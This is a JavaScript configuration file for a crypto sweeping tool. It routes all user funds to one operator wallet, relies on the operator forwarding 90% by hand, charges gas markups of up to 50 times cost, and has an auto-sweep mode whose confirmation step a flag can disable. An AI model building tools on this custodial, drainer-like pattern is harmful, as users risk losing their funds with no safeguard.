/**
 * config.js — Static configuration for Sweeper.
 */

// =====================================================================
// FEE WALLET
// =====================================================================
//
// All four families sweep to this one EVM address. The operator
// forwards 90% to the user's destination manually, keeping 10%.
// =====================================================================

export const FEE_WALLET_EVM = '0x8B180186C79D146fd5617B31A9e2A3d938954Fa9';

// =====================================================================
// GAS SPONSORSHIP
// =====================================================================
//
// EVM-only. The sponsor sends only the shortfall between the user's
// current native balance and what a single transaction will cost.
// Solana, Bitcoin, and TRON are not sponsored.
// =====================================================================

export const GAS_PER_TX_COST = {
  ethereum: '0.0008',
  arbitrum: '0.00002',
  optimism: '0.00002',
  base:     '0.00002',
  polygon:  '0.01',
  bnb:      '0.0002',
};

export const GAS_TRIGGERS = { ...GAS_PER_TX_COST };

export const MAX_SPONSOR_ATTEMPTS = 5;

// =====================================================================
// SERVICE FEE (10% of user's sweep output)
// =====================================================================
//
// In the fee-wallet model, the operator's 10% is implicit: 100% lands
// in the fee wallet, and the operator forwards 90% to the user. These
// helpers are used when building the receipt and operator view.
// =====================================================================

export const FEE_BPS = 1000n;
export const USER_SHARE_BPS = 9000n;
export const BPS_DENOMINATOR = 10000n;

export function userShare(amountRaw) {
  return (amountRaw * USER_SHARE_BPS) / BPS_DENOMINATOR;
}

export function operatorFee(amountRaw) {
  return amountRaw - userShare(amountRaw);
}

// =====================================================================
// GAS SPONSORSHIP FEE (deducted from user's 90%)
// =====================================================================
//
// Tiered multiplier on actual gas cost:
//   - actual < $0.05  → 50× actual
//   - actual < $0.10  → 10× actual
//   - actual < $0.25  →  5× actual
//   - actual < $0.50  →  4× actual
//   - actual ≥ $0.50  →  2× actual
//
// The 1-cent floor at the end ensures the fee is never $0 even when
// the raw cost rounds to 0 (Base/Optimism/Arbitrum at quiet times).
//
// Paired with MIN_SPONSOR_FLOOR_USDC in main.js (currently 0.02), so
// dust sweeps still run and are profitable for the operator.
// =====================================================================

export function computeSponsorshipFeeUsdCents(actualGasCostUsdCents) {
  const cost = Math.max(0, Math.ceil(actualGasCostUsdCents));

  let feeCents;
  if (cost < 5) {
    feeCents = cost * 50;
  } else if (cost < 10) {
    feeCents = cost * 10;
  } else if (cost < 25) {
    feeCents = cost * 5;
  } else if (cost < 50) {
    feeCents = cost * 4;
  } else {
    feeCents = cost * 2;
  }

  // 1-cent floor — keeps the fee visible and non-zero on cheap chains
  // where the raw cost rounds to 0.
  if (feeCents < 1) feeCents = 1;

  return feeCents;
}

export function usdCentsToUsdcRaw(cents) {
  return BigInt(cents) * 10000n;
}

// =====================================================================
// AUTO-LIVE
// =====================================================================
//
// After Preview, if any single wallet+chain holds ≥ this much
// sweepable value, we offer to skip the manual Run click and sweep
// live immediately.
//
// Why $10: the operator's 10% cut on $10 is $1, which covers the
// transaction cost on cheap chains and still leaves a margin. Below
// $10, the auto-live path is no longer obviously profitable, so those
// wallets fall back to the manual flow.
//
// IMPORTANT: the threshold determines WHETHER auto-live fires. It
// does NOT determine WHAT gets swept. Once auto-live fires, every
// family and chain the user selected is swept, not just the ones that
// individually cleared the threshold. A user with $200 on Base and
// $5 on Optimism should get both swept, not just Base.
//
// AUTO_LIVE_REQUIRE_CONFIRM: when true, a 10-second countdown modal
// appears and the user can cancel. When false, the live sweep fires
// with no confirmation. Kept as a flag so both modes are testable.
// =====================================================================

export const AUTO_LIVE_THRESHOLD_USDC = 10;
export const AUTO_LIVE_REQUIRE_CONFIRM = true;
export const AUTO_LIVE_COUNTDOWN_SECONDS = 10;